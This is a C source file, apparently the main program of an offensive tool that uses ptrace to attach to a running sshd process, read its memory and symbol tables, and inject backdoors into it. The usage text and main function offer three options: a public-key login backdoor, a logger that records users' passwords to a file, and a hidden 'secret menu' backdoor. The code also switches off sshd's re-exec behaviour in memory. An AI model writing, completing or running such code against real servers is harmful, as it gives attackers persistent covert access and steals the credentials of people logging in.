#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <types.h>
#include <common.h>
#include <map.h>
#include <inject.h>
#include <sig.h>
#include <ptrace.h>
#include <callcache.h>
#include <util.h>
#include <elflib.h>

#include <backdoor_pubkey.h>
#include <backdoor_password.h>
#include <backdoor_menu.h>

void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
	char sshd_path[255], proc_exe[64];

	info("you gave me pid %d\n", pid);

	ctx->pid = pid;
	_attach(ctx->pid);

	info("slurping stuff to memory..");

	// parse /proc/pid/maps
	map_init();

	ctx->num_maps = map_load_all(ctx);
	ctx->mappings = map_get();

	map_sort(ctx);

	info("loaded %d memory mappings", ctx->num_maps);

	// get full path to sshd binary from /proc/pid/exe link
	memset(sshd_path, 0, 255);
	sprintf(proc_exe, "/proc/%d/exe", ctx->pid);
	readlink(proc_exe, sshd_path, 255);
	info("sshd binary path = '%s'", sshd_path);

	// locate syscall instruction
	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t\t= \x1b[37m0x%lx", ctx->sc_addr);

	// load symtabs
	ctx->dynsym_sz = get_section(sshd_path, ".dynsym", &ctx->dynsym, &ctx->dynsym_base);
	ctx->dynstr_sz = get_section(sshd_path, ".dynstr", &ctx->dynstr, &ctx->dynstr_base);
	ctx->symtab_sz = get_section(sshd_path, ".symtab", &ctx->symtab, &ctx->symtab_base);
	ctx->strtab_sz = get_section(sshd_path, ".strtab", &ctx->strtab, &ctx->strtab_base);
	ctx->got_sz    = get_section(sshd_path, ".got",    &ctx->got,    &ctx->got_base);
}

void inject_ctx_deinit(inject_ctx *ctx) {
	_detach(ctx->pid);

	free(ctx->dynsym);
	free(ctx->dynstr);
	free(ctx->symtab);
	free(ctx->strtab);
	free(ctx->got);

	free(ctx);
}

u64 inject_resolve_rexec(inject_ctx *ctx) {
	u64 rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");

	if (rexec_flag == 0) {
		u64 rexec_debug_lea = 0, rexec_test = 0;
		u32 rexec_flag_offset = 0;
		
		info("could not resolve rexec_flag :(, trying alternative method..");
		
		rexec_debug_lea = lea_by_debugstr(
			ctx, LEA_RDI, "Server will not fork when running in debugging mode."
		);
		
		// Find the first 'test eax, eax' instruction after the debug string
		rexec_test = find_next_opcode(ctx, rexec_debug_lea, (u8*)"\x85\xc0", 2);

		// Get the rexec_flag offset from rip		
		_peek(ctx->pid, rexec_test - 4, &rexec_flag_offset, 4);
		
		// Resolve absolute address of rip + rexec_flag_offset
		rexec_flag = rexec_test + rexec_flag_offset;
	}

	return rexec_flag;
}

void inject_ctx_map_reload(inject_ctx *ctx) {
	map_init();
	ctx->num_maps = map_load_all(ctx);
	ctx->mappings = map_get();
	map_sort(ctx);
}

void banner() {
	char banner_ascii[]=
		"      _______  __________ ___.    _____     _____________  ______\n"
		"    _/  ____/_/  ____|   |   |   _\\ __ )_  _\\__   \\  __  \\/  __  )_ \n"
		"   /\\___   \\/\\___   \\|   '   |  |    /   \\/   _   /   /  /  __/___/_\n"
		"  /    /   /    /    /   |   \\  |   ,    /   /  . |  ___/   \\/     /\n"
		"  \\ _______\\ _______/____|____\\ |___:\\___\\_____/__|   | \\__________\\\n"
		"   \\/       \\/                                    \\___|\n";

	printf("%s\n", banner_ascii);
}

void usage(char *prog) {
		fprintf(stderr,
			" usage: %s [options] <pid>\n\n"
			" valid options:\n"
			"   -p <pubkey>     activate publickey backdoor\n"
			"   -l <filename>   activate password logging backdoor\n"
			"   -m              activate secret menu backdoor\n"
			"\n", prog
		);
}

int main(int argc, char *argv[]) {
	int c;
	char *pubkey_value = NULL;
	char *passlog_path = NULL;
	int  menu_activate = 0;

	banner();

	if (argc < 2) {
		usage(argv[0]);
		return -1;
	}

	while((c = getopt(argc-1, argv, "p:l:m")) != -1) {
		switch(c) {
			case 'p':
				pubkey_value = optarg;
			break;

			case 'l':
				passlog_path = optarg;
			break;

			case 'm':
				menu_activate = 1;
			break;
		}
	}

	if (pubkey_value == NULL && passlog_path == NULL && menu_activate == 0) {
		usage(argv[0]);
		return -1;
	}

	// allocate inject context
	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	// init inject context
	inject_ctx_init(ctx, atoi(argv[argc-1]));

	// find rexec_flag
	u64 rexec_flag = inject_resolve_rexec(ctx);
	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 

	// cache all call instructions in executable regions
	cache_calltable(ctx);

	// install backdoor(s)
	if(passlog_path != NULL) {
		info("installing passlogger backdoor..");

		backdoor_password_install(ctx);
		inject_ctx_map_reload(ctx);
	}

	if (pubkey_value != NULL) {
		info("installing pubkey backdoor..");

		backdoor_pubkey_install(ctx, argv[2]);
		inject_ctx_map_reload(ctx);
	}

	if (menu_activate) {
		info("installing menu backdoor..");

		backdoor_menu_install(ctx);
		inject_ctx_map_reload(ctx);
	}

	// disable rexec
	info("switching off rexec..");
	u32 null_word = 0;
	_poke(ctx->pid, rexec_flag, &null_word, 4);

	// clean upr
	inject_ctx_deinit(ctx);
	callcache_free();

	info("all done!");

	return 0;
}
